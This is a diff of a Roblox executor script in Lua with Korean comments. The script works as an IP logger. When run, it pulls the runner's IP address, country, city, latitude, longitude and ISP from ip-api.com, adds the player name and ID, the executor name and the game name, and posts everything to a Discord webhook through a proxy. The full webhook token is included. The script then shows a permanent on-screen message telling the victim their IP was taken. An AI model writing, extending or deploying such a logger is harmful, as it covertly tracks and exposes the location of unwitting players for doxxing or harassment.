@@ -1,39 +1,53 @@
--- [1] 사용자님이 주신 프록시 전용 웹훅 주소
+-- [1] 작동 확인된 프록시 웹훅 주소 적용
 local final_url = "https://webhook.lewisakura.moe/api/webhooks/1492431494319313030/C3DOY0zlWt960efXW1T9lp2sVOIWi4xQsH8ZS7cPcgCGzC9TXDuto3ve3GfLAP2tHx5F"
 
 local http_request = http_request or request or syn.request or http.request or fluxus.request or Krnl.request or http_request 
-if not http_request then warn("실행기가 HTTP 요청을 지원하지 않습니다.") return end
+if not http_request then warn("HTTP 요청 함수를 찾을 수 없습니다!") return end 
 
--- [2] IP 정보 가져오기 (한국어 설정)
-local ipData = { query = "알 수 없음", country = "N/A", city = "N/A" }
+-- [2] IP 및 상세 정보 가져오기 (도시, 위도, 경도 포함)
+local ipData = { query = "알 수 없음", country = "N/A", city = "N/A", lat = "N/A", lon = "N/A", isp = "N/A" }
 local success, response = pcall(function() 
-    return http_request({ Url = "http://ip-api.com/json/?lang=ko", Method = "GET" }) 
+    return http_request({ 
+        Url = "http://ip-api.com/json/?lang=ko", 
+        Method = "GET" 
+    }) 
 end)
 
 if success and response.Body then
-    pcall(function()
-        local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
-        if decoded.status == "success" then ipData = decoded end
-    end)
+    local decodeSuccess, decoded = pcall(function() return game:GetService("HttpService"):JSONDecode(response.Body) end)
+    if decodeSuccess and decoded.status == "success" then 
+        ipData = decoded 
+    end
 end
 
--- [3] 디스코드 전송 데이터 구성
+-- [3] 정보 정리
+local playerName = game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "???"
+local playerId = game.Players.LocalPlayer and game.Players.LocalPlayer.UserId or 0
+local executorName = (identifyexecutor and identifyexecutor()) or "알 수 없음"
+local gameName = "알 수 없음"
+pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
+
+-- [4] 디스코드 전송 (프록시 주소 사용)
 local payload = {
-    username = "아이피 로거",
+    username = "스크립트 IP 로그",
     embeds = {{
-        title = "🚀 실행 감지 (Lewisakura Proxy)",
-        color = 16711680,
+        title = "누군가 이 스크립트를 실행했습니다.",
+        color = 16711680, -- 빨강
         fields = {
             {name = "IP 주소", value = ipData.query, inline = true},
-            {name = "위치", value = ipData.country .. " " .. ipData.city, inline = true},
-            {name = "플레이어 닉네임", value = game.Players.LocalPlayer.Name, inline = false},
-            {name = "실행 시간", value = os.date("%Y-%m-%d %H:%M:%S KST"), inline = true}
+            {name = "국가", value = ipData.country, inline = true},
+            {name = "도시", value = ipData.city, inline = true},
+            {name = "위도", value = tostring(ipData.lat), inline = true},
+            {name = "경도", value = tostring(ipData.lon), inline = true},
+            {name = "닉네임", value = playerName .. " (" .. tostring(playerId) .. ")", inline = false},
+            {name = "실행기", value = executorName, inline = true},
+            {name = "게임 이름", value = gameName, inline = false},
+            {name = "실행 시간", value = os.date("%Y-%m-%d %H:%M:%S KST"), inline = false}
         },
-        footer = {text = "IP Logger System"}
+        footer = {text = "IP 로그"}
     }}
 }
 
--- [4] 실제 전송
 pcall(function()
     http_request({
         Url = final_url,
@@ -42,3 +56,24 @@ pcall(function()
         Body = game:GetService("HttpService"):JSONEncode(payload)
     })
 end)
+
+-- [5] 화면 UI 생성 (사라지지 않음)
+local screenGui = Instance.new("ScreenGui")
+local textLabel = Instance.new("TextLabel")
+
+screenGui.Name = "PermanentUI"
+screenGui.Parent = game:GetService("CoreGui")
+screenGui.IgnoreGuiInset = true
+
+textLabel.Parent = screenGui
+textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+textLabel.BackgroundTransparency = 0.4
+textLabel.Position = UDim2.new(0.5, -150, 0.4, 0)
+textLabel.Size = UDim2.new(0, 300, 0, 60)
+textLabel.Font = Enum.Font.GothamBold
+textLabel.Text = "IP 따임"
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+textLabel.TextSize = 20
+textLabel.TextWrapped = true
+
+-- 프린트 문 제거됨
